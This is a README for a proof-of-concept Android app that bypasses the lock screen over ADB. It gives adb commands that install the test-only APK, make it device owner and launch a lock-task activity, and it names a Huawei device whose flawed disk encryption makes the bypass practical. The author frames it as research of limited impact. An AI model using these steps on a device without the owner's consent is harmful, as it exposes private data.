## Introduction
This is just a PoC for getting access to your Android phone and private app data without your lock screen password. 

However, the attacker needs to get ADB access first, and the device needs to be decrypted, so it's almost impossible to be successfully exploited. 
Thus I don't think this is a security issue.

But I found a device (Huawei Nova 1, Android 7.0, EMUI 5.0.4) uses full-disk encryption 
but it have abnormal FDE implementations so the attacker can break out of lock screen 
and get access to the device with only ADB access.

## Test
1. Build the app
2. Connect the device to your PC
3. Open CMD, `adb install -t /path/to/app-debug.apk` (The app is marked as `testOnly`, so do NOT remove the `-t` flag)
4. `adb shell dpm set-device-owner top.canyie.bypasskeyguard/.DeviceAdmin`
5. `adb shell am start top.canyie.bypasskeyguard/.LockTaskActivity`
